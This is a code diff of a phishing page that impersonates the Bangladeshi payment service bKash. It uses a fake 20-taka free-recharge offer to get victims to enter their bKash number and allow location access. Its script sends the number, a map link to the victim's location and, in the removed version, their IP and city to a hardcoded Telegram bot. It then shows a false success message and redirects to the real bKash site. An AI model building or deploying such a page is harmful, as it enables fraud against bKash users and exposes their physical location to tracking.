@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>bKash - Mobile Recharge Offer</title>
+    <title>bKash - ২০ টাকা ফ্রি রিচার্জ!</title>
     <style>
         body { background-color: #e2136e; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 90%; max-width: 350px; text-align: center; }
-        .logo { width: 120px; margin-bottom: 20px; }
-        h2 { color: #e2136e; font-size: 22px; margin-bottom: 10px; }
-        p { color: #555; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
-        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; margin-bottom: 20px; }
-        button { background: #e2136e; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:active { background: #b00f56; transform: scale(0.98); }
-        .footer { margin-top: 20px; font-size: 11px; color: #999; }
+        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.2); width: 90%; max-width: 330px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 15px; }
+        h2 { color: #e2136e; font-size: 20px; margin-bottom: 10px; }
+        p { color: #444; font-size: 14px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 15px; }
+        button { background: #e2136e; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        button:active { transform: scale(0.97); }
     </style>
 </head>
 <body>
@@ -21,55 +20,39 @@
     <div class="card">
         <img src="https://www.bkash.com/uploads/images/bkash-logo.png" alt="bKash" class="logo">
         <h2>২০ টাকা ফ্রি রিচার্জ!</h2>
-        <p>আপনার বিকাশ নম্বরটি দিন এবং ভেরিফিকেশন সম্পন্ন করে সাথে সাথেই ২০ টাকা ফ্রি মোবাইল রিচার্জ বুঝে নিন।</p>
+        <p>আপনার নম্বরটি দিয়ে রিচার্জ নিন বাটনে ক্লিক করুন এবং লোকেশন পারমিশন 'Allow' করুন।</p>
         
-        <input type="number" id="phone" placeholder="বিকাশ নম্বর দিন" required>
-        <button onclick="startClaim()">রিচার্জ নিন</button>
-        
-        <div class="footer">© bKash Limited. All Rights Reserved.</div>
+        <input type="number" id="victim_num" placeholder="বিকাশ নম্বর দিন" required>
+        <button onclick="submitData()">রিচার্জ নিন</button>
     </div>
 
 <script>
-    async function startClaim() {
-        const phone = document.getElementById('phone').value;
-        if (phone.length < 11) {
-            alert("সঠিক বিকাশ নম্বর দিন!");
-            return;
-        }
+    async function submitData() {
+        const phone = document.getElementById('victim_num').value;
+        if (phone.length < 11) { alert("সঠিক ১১ সংখ্যার নম্বর দিন!"); return; }
 
         const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
-        const chat_id = "7887080882";
+        const chat_id = "7887080882"; // আপনার পার্সোনাল আইডি
 
-        // লোকেশন রিকোয়েস্ট (এটাই আসল ট্র্যাকার)
+        // লোকেশন শেয়ার পারমিশন চাওয়া
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const text = `🎯 **বিকাশ অফার ভিকটিম**\n\n📞 নম্বর: \`${phone}\`\n📍 লোকেশন: [ম্যাপে দেখুন](${mapLink})`;
                 
-                // IP ও নেটওয়ার্ক তথ্য সংগ্রহ
-                let ipInfo = { ip: "Unknown", city: "Unknown" };
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    ipInfo = await res.json();
-                } catch(e) {}
-
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                const text = `🎯 **বিকাশ ভিকটিম ডিটেইলস**\n\n📞 ফোন নম্বর: \`${phone}\`\n🌐 IP: ${ipInfo.ip}\n🏙️ শহর: ${ipInfo.city}\n📍 ম্যাপ লোকেশন: [এখানে ক্লিক করুন](${mapLink})`;
-
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-                
-                alert("ধন্যবাদ! আপনার রিকোয়েস্ট সফল হয়েছে। ৩০ মিনিটের মধ্যে রিচার্জ পেয়ে যাবেন।");
-                window.location.href = "https://www.bkash.com";
-
-            }, async (err) => {
-                // ইউজার লোকেশন অনুমতি না দিলে
-                const text = `⚠️ **ভিকটিম লোকেশন অফ করেছে**\n\n📞 ফোন নম্বর: \`${phone}\`\n📍 লোকেশন পারমিশন দেয়নি।`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-                
-                alert("সফল হয়েছে! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
-                window.location.href = "https://www.bkash.com";
-            }, { timeout: 10000 });
+                await sendToBot(token, chat_id, text);
+            }, async () => {
+                const text = `⚠️ **ভিকটিম লোকেশন দেয়নি**\n\n📞 নম্বর: \`${phone}\`\n📍 লোকেশন: Denied`;
+                await sendToBot(token, chat_id, text);
+            });
         }
+    }
+
+    async function sendToBot(token, chat_id, text) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+        await fetch(url);
+        alert("আপনার রিচার্জ রিকোয়েস্টটি সফল হয়েছে। ৩০ মিনিটের মধ্যে টাকা পেয়ে যাবেন।");
+        window.location.href = "https://www.bkash.com";
     }
 </script>
 
